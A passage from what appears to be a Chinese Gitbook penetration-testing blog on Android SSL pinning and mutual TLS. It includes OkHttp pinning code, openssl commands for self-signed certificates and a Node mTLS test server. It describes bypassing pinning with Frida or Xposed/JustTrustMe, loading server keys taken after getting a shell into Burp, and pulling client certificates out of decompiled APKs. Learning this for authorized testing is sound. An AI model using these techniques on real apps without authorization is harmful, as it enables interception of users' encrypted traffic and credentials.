trustManagerFactory.getTrustManagers(), null); // 构建OkHttpClient，设置SSL Socket Factory return new OkHttpClient.Builder() .sslSocketFactory(sslContext.getSocketFactory(), (X509TrustManager) trustManagerFactory.getTrustManagers()[0]) .build(); }catch (Exception e){ e.printStackTrace(); return null; } } } 使用BurpSuite抓包可以看到由于Burp的证书没有被信任，导致抓包可以看到response的响应体告知证书不被信任 通过frida hook 可以看到使用的是okhttp框架的SSL Pinning 当存在SSL Pinning 的时候只要能hook到对服务端证书的校验，就可以直接抓包，所以只需要使用frida的脚本或者JustTrustMe包含足够多的框架对服务端的校验，就能完成正常抓包工作 在了解了SSL Pining的认证过程之后，可以看到其实是客户端强行校验了服务端证书，所以在中间人攻击的流程中，在SSL握手的时候，由于会校验后端证书，导致Burp的证书在进行证书校验的时候证书校验不通过就会出现SSL连接错误，正常的app就会出现网络连接失败的错误（logcat中可以看见） root过的机器，通过frida hook 可以直接绕过SSL Pinning 检测，直接抓包 root过的机器，通过Xposed + JustTruestMe（足够强的hook 脚本 ），可以绕过SSL Pinning检测，直接抓包 非root的机器，通过VirtualXposed + JustTrustMe，可以绕过SSL Pinning检测，直接抓包 自签证书，get shell之后拿到服务器Server.key,Server.crt，生成PK12格式证书，导入到BurpSuite，此时在中间人攻击的时候app与burp通信的时候就是app对自签服务端证书进行校验，通过之后，burp在与服务端进行通信最后再转发至app 针对第4点进行阐述如下： 生成自签名CA私钥，CA证书、Server.key、Server.crt openssl genpkey -algorithm RSA -out ca.key openssl req -new -key ca.key -out ca.csr openssl x509 -req -in ca.csr -signkey ca.key -out ca.crt # 生成服务端证书私钥 openssl genpkey -algorithm RSA -out server.key # 生成服务器证书请求，这里需要将CN改变成我们的域名 openssl req -new -key server.key -out server.csr # 生成服务器证书文件，因为要生成包含 SAN 信息的证书，为了不去更改/etc/ssl/openssl.cnf的配置文件，所以手动添加subjectAltName=DNS:www.bk3.info openssl x509 -req -in server.csr -out server.crt -CA ca.crt -CAkey ca.key -CAcreateserial -days 365 -sha256 -extfile 在web浏览器中查看自签的域名 此时我们可以将CA证书导入到系统证书中，就不会再报SSL错误 在okhttp框架校验服务器证书中添加自签的Server证书 private OkHttpClient getOkHttpClient(){ try{ // 从res/raw目录中读取证书 InputStream inputStream = ((Activity)mContext).getResources().openRawResource(R.raw.server); // 创建 Certificate 对象 CertificateFactory certificateFactory = CertificateFactory.getInstance(\"X.509\"); Certificate certificate = certificateFactory.generateCertificate(inputStream); // 创建 KeyStore 并将证书添加进去 KeyStore keyStore = KeyStore.getInstance(KeyStore.getDefaultType()); keyStore.load(null, null); keyStore.setCertificateEntry(\"certificate\", certificate); // 创建TrustManagerFactory，并将KeyStore初始化到TrustManagerFactory中 TrustManagerFactory trustManagerFactory = TrustManagerFactory.getInstance( TrustManagerFactory.getDefaultAlgorithm()); trustManagerFactory.init(keyStore); // 创建SSLContext，使用TrustManagerFactory初始化 SSLContext sslContext = SSLContext.getInstance(\"TLS\"); sslContext.init(null, trustManagerFactory.getTrustManagers(), null); // 构建OkHttpClient，设置SSL Socket Factory return new OkHttpClient.Builder() .sslSocketFactory(sslContext.getSocketFactory(), (X509TrustManager) trustManagerFactory.getTrustManagers()[0]) .build(); }catch (Exception e){ e.printStackTrace(); return null; } } 服务端证书为自签证书 当burp的CA证书还是portSwigger的时候，会报SSL连接错误 当通过其他手段获取到服务端证书、服务端证书私钥，将其做成能导入的burpsuite的pkcs#12格式的keyStore（证书交换文件） openssl pkcs12 -export -out certificate.pfx -inkey server.key -in server.crt Enter Export Password: Verifying - Enter Export Password: 不推荐使用替换burp的根证书，下面还有其他方法，这一步只是解决困扰我两个晚上的问题，导入CA证书到底是什么意思 可以再这里点击下载我们导入的server证书，通过openssl命令来校验证书是否是导入的证书 openssl x509 -in cacert.der -text -noout 或者如果不愿意直接修改BurpSuite的根证书，也可以在此处添加证书文件，如果应用程序使用的客户端需要特定的服务器证书（也就是客户端需要校验服务端证书 == 客户端存在服务端证书校验 == SSL Pinning） 此时我们已经将burp的CA证书变成服务端自签名证书，此时就可以抓包测试了，就可以完成中间人攻击 即使系统不信任自签的根证书一样可以抓包 双向认证 首先需要通过openssl获取自签名证书生成clientCA、clientCA_key、client.crt、client.key，然后将ClientCA证书放置到服务端，通过ClientCA证书来校验客户端证书的合法性 const express = require('express') const https = require('https') const fs = require('fs') const app = new express() var index = 0 // Middleware for handling client certificate validation app.use((req, res, next) => { const clientCert = req.connection.getPeerCertificate() console.log('Received client certificate request') if (!clientCert.subject) { // 利用clientCA证书来校验client证书是否有效 return res.status(401).send('Client certificate not provided') } // Your custom validation logic here // For example, you might check the client certificate's subject or issuer // You can also perform additional checks like expiration date, etc. console.log('Client certificate validated:', clientCert.subject) next() }) app.get('/', (req, res) => { res.send('its working') }) app.post('/testPost', (req, res) => { index++ res.send('post working\\t' + index) }) var options = { key: fs.readFileSync('./server.key'), cert: fs.readFileSync('./server.crt'), ca: fs.readFileSync('./client_ca.crt'), // Optional: Specify CA certificate for client verification requestCert: true, rejectUnauthorized: true } const httpsServer = https.createServer(options, app) httpsServer.listen(8088, () => { console.log('https running!') }) 然后我们可以查看服务端，未提供client证书，导致无法访问 使用client.crt、client.keyopenssl生成burp可识别的pkcs#12文件，导入到burp中 最后我们挂上burp代理，就可以发现可以访问需要校验客户端证书的web服务，这个时候burp因为加载了我们的客户端证书，所以就是我们的客户端 再看客户端校验服务端的证书，这时就需要服务端的CA证书 [!TIP] 为了安全起见，客户端CA和服务端CA不是同一个，可用于基础校验，通过各自的CA证书来校验传递到（客户端/服务端）证书的合法性，当然还可以校验除合法性之外的其他证书内容 由于我不知道怎么让客户端识别我自己生成的pkcs#12证书、所以我就用client.crt、client.key 在代码层重新生成keyStore android 客户端使用client.crt、client.key、CA.crt（服务端CA证书）来完成将证书客户端证书信息发送给服务端，以及利用服务端CA证书来完成对服务端证书的校验，以此来完成客户端对服务端的校验 package com.example.myapplication; import android.app.Activity; import android.content.Context; import android.os.AsyncTask; import android.widget.TextView; import java.io.BufferedReader; import java.io.InputStream; import java.io.InputStreamReader; import java.security.KeyFactory; import java.security.SecureRandom; import java.security.cert.Certificate; import java.security.cert.CertificateException; import java.security.cert.CertificateFactory; import java.security.KeyStore; import java.security.cert.X509Certificate; import java.security.spec.PKCS8EncodedKeySpec; import java.util.Base64; import javax.net.ssl.KeyManagerFactory; import javax.net.ssl.SSLContext; import javax.net.ssl.SSLSocketFactory; import javax.net.ssl.TrustManager; import javax.net.ssl.TrustManagerFactory; import javax.net.ssl.X509TrustManager; import okhttp3.*; public class OkHttpAsyncTask extends AsyncTask { private Context mContext; public OkHttpAsyncTask(Context mContext){ this.mContext = mContext; } @Override protected String doInBackground(String... params) { OkHttpClient client = createOkHttpClient(); // 检查 OkHttpClient 是否为 null if (client == null) { return \"Error: OkHttpClient is null\"; } RequestBody formBody = new FormBody.Builder().add(\"username\",params[1]).add(\"password\",params[2]).build(); Request request = new Request.Builder() .url(params[0]) // 使用一个示例API .post(formBody) .build(); try{ Response response = client.newCall(request).execute(); if (response.isSuccessful()) { return response.body().string(); } else { return \"Error: \" + response.code() + \" \" + response.message(); } }catch (Exception e){ e.printStackTrace(); return \"Error: \" + e.getMessage(); } } @Override protected void onPostExecute(String result) { TextView textView = ((Activity)mContext).findViewById(R.id.MainTextView); textView.setText(result); } private OkHttpClient createOkHttpClient() { try{ InputStream clientCertInputStream = ((Activity)mContext).getResources().openRawResource(R.raw.clienttest); InputStream clientKeyInputStream = ((Activity)mContext).getResources().openRawResource(R.raw.client); InputStream caCertInputStream = ((Activity)mContext).getResources().openRawResource(R.raw.ca); KeyStore keyStore = KeyStore.getInstance(\"PKCS12\"); keyStore.load(null, null); // Initialize empty keystore keyStore.setCertificateEntry(\"ca\", loadCertificate(caCertInputStream)); keyStore.setKeyEntry(\"client\", loadPrivateKey(clientKeyInputStream), \"your_protected_password\".toCharArray(), new java.security.cert.Certificate[]{loadCertificate(clientCertInputStream)}); // 创建 TrustManager，用于验证服务器证书 TrustManager[] trustManagers = {new X509TrustManager() { @Override public void checkClientTrusted(X509Certificate[] chain, String authType) throws CertificateException { // Client authentication is not needed in this context } @Override public void checkServerTrusted(X509Certificate[] chain, String authType) throws CertificateException { // Implement server certificate validation logic here try { checkServerCertificate(chain); } catch (Exception e) { throw new RuntimeException(e); } } @Override public X509Certificate[] getAcceptedIssuers() { return new X509Certificate[0]; } }}; // 初始化 KeyManagerFactory KeyManagerFactory keyManagerFactory = KeyManagerFactory.getInstance(KeyManagerFactory.getDefaultAlgorithm()); keyManagerFactory.init(keyStore, \"your_protected_password\".toCharArray()); // 初始化 SSLContext SSLContext sslContext = SSLContext.getInstance(\"TLS\"); sslContext.init(keyManagerFactory.getKeyManagers(), trustManagers, new SecureRandom()); // 获取 SSLSocketFactory SSLSocketFactory sslSocketFactory = sslContext.getSocketFactory(); // 配置 OkHttpClient OkHttpClient okHttpClient = new OkHttpClient.Builder() .sslSocketFactory(sslSocketFactory, (X509TrustManager) trustManagers[0]) .build(); return okHttpClient; }catch (Exception e){ e.printStackTrace(); return null; } } private X509Certificate loadCertificate(InputStream inputStream) throws Exception { CertificateFactory certificateFactory = CertificateFactory.getInstance(\"X.509\"); return (X509Certificate) certificateFactory.generateCertificate(inputStream); } private java.security.PrivateKey loadPrivateKey(InputStream inputStream) throws Exception { // Implement logic to load private key from inputStream (e.g., using KeyFactory) // ... try (BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream))) { StringBuilder keyLines = new StringBuilder(); String line; while ((line = reader.readLine()) != null) { if (!line.startsWith(\"-----\") && !line.isEmpty()) { keyLines.append(line); } } // Base64解码 byte[] encoded = Base64.getDecoder().decode(keyLines.toString()); // 生成私钥对象 KeyFactory keyFactory = KeyFactory.getInstance(\"RSA\"); return keyFactory.generatePrivate(new PKCS8EncodedKeySpec(encoded)); } catch (Exception e) { e.printStackTrace(); return null; } } private void checkServerCertificate(X509Certificate[] chain) throws Exception { // 在这里添加服务端证书验证逻辑 // 例如：检查证书是否在有效期内，是否由受信任的 CA 签发等 // 获取客户端信任的 CA 证书 InputStream caCertInputStream = ((Activity)mContext).getResources().openRawResource(R.raw.ca); X509Certificate trustedCACertificate = loadCertificate(caCertInputStream); // 验证证书链 verifyCertificateChain(chain, trustedCACertificate); } private void verifyCertificateChain(X509Certificate[] chain, X509Certificate trustedCACertificate) throws CertificateException { // 在这里实现验证证书链的逻辑 // 例如：检查证书是否在有效期内，是否由受信任的 CA 签发等 // 获取服务器证书 X509Certificate serverCertificate = chain[0]; // 验证证书是否由受信任的 CA 签发 try { serverCertificate.verify(trustedCACertificate.getPublicKey()); } catch (Exception e) { throw new CertificateException(\"Server certificate verification failed.\", e); } // 其他验证逻辑... } } 当我们启动app之后，代理到burp中可以看到服务端证书不被信任（也就是app校验burp的证书失败） 可以看到这个时候我们的app和服务端已经完全开启双向认证了 此时我们需要对apk进行反编译，获取到${app_home}/res/raw/client.crt、${app_home}/res/raw/client.key或者${app_home}/res/raw/client.p12，如果是p12格式的文件，需要去获取到密钥，如果是证书文件，可以先试用openssl命令尝试是否能通过校验 [!TIP] 我这里只是为了方便使用android的R方法直接获取在这个目录下的证书文件 查阅部分资料，发现大部分是放在这个文件里的（纯java android），还有其他放在assets目录下，目前暂未遇到 openssl s_client -connect www.bk3.info:8088 -cert client.crt -key client.key 当证书校验通过之后，那么在read BLOCK处就可以发送request请求 如果证书校验不通过是如下状态 当明白证书的双向校验逻辑之后，那么将burpsuite当作客户端，导入客户端证书，那么就只需要解决客户端对服务端证书的校验，那么和SSL Pinning 方法同理 root过的机器，通过frida hook 可以直接绕过SSL Pinning 检测，直接抓包 root过的机器，通过Xposed + JustTruestMe（足够强的hook 脚本 ），可以绕过SSL Pinning检测，直接抓包 非root的机器，通过VirtualXposed + JustTrustMe，可以绕过SSL Pinning检测，直接抓包 自签证书，get shell之后拿到服务器Server.key,Server.crt，生成PK12格式证书，导入到BurpSuite，此时在中间人攻击的时候app与burp通信的时候就是app对自签服务端证书进行校验，通过之后，burp在与服务端进行通信最后再转发至app 当然也可以导入由server.crt、和server.key 生成的p12格式证书，替换burpsuite格式的证书，但是不推荐，SSL Pining章节只是为了完成之前一个项目的纠结点 一些小TIPS Q：如果我们能拿到受信任的证书颁发机构的根证书（CA.crt）以及证书颁发机构的根证书私钥（CA.key），将burpsuite证书替换，是否可以实现客户端不用导入证书抓包 A: 理论上应该是的，通过对中间人攻击的梳理，应该是可以的。 受信任的证书颁发机构的根证书（CA.crt）以及证书颁发机构的根证书密钥(CA.key)，是肯定不可能泄漏给任何个人及组织，如果泄漏了，那么可以使用根证书和根证书私钥任意签发受信任的证书，那么受信任的根证书机构就变得不受信任了。所以burpsuite的CA证书，也是自签名的，必须要导入到系统根证书目录下，且默认信任才能实现中间人攻击 Q：根证书校验服务器/客户端证书的流程 A：CA证书中包含了CA机构的信息，以及CA机构的公钥。在验证服务端/客户端证书时，客户端/服务端需要使用CA证书来验证服务端/客户端证书的合法性。如果CA证书无效或者未通过验证，客户端/服务端将无法信任任何由该CA机构颁发的证书 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2024-09-07 15:42:52 "},"友情链接.html":{"url":"友情链接.html","title":"友情链接","keywords":"","body":"友情链接 Alias ID Address D4m1ts https://blog.gm7.org/ Yanghao https://yanghaoi.github.io/ Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-06-10 19:08:13 "}}